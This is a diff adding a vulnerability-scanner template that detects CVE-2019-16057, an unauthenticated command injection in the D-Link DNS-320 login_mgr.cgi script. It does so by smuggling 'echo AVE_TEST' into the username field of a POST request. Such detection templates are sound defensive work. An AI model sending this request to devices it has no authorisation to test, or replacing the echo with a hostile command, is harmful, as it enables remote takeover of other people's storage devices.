@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "D-Link DNS-320 login_mgr.cgi 远程命令注入漏洞检测。通过向 /cgi-bin/login_mgr.cgi 发送特制 POST 请求，在 username 参数中注入系统命令，可导致未经认证的远程代码执行。"
+id = "POC-AVE-2019-0708"
+name = "CVE-2019-16057 PoC"
+severity = "critical"
+tags = [
+    "cve-2019-16057",
+    "dlink",
+    "dns-320",
+    "rce",
+]
+vuln_id = [
+    "CVE-2019-16057",
+    "AVE-2019-0708",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/login_mgr.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin%3Becho+AVE_TEST&password=admin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
